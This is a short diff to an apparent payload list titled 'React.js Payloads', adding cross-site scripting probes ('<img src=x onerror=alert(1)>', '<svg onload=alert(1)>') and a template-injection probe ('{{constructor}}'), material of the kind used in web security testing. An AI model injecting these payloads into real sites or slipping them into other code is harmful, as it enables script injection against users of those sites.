@@ -1,2 +1,7 @@
--e # react Payload 24
+-e # React.js Payloads
 # Version: 1.0.15-20260301-Minggu-1621-WIB
+
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+{{constructor}}
+{/* comment */}
